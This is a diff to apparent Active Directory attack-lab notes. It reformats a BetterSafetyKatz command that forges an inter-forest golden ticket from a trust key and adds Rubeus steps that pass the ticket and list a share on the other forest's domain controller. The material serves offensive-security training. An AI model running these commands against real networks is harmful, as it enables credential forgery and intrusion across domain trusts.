@@ -786,11 +786,17 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 - An inter-forest TGT can be forged
 
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
 ```
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden
-/user:Administrator /domain:dollarcorp.moneycorp.local
-/sid:S-1-5-21-719815819-3726368948-3917688648
-/rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt
-/target:eurocorp.local
-/ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
-```
+
+
+- Abuse with Rubeus
+- Using the same TGT which we forged earlier:
+
+Rubeus.exe asktgs
+/ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
+/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-
+dc.eurocorp.local /ptt
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
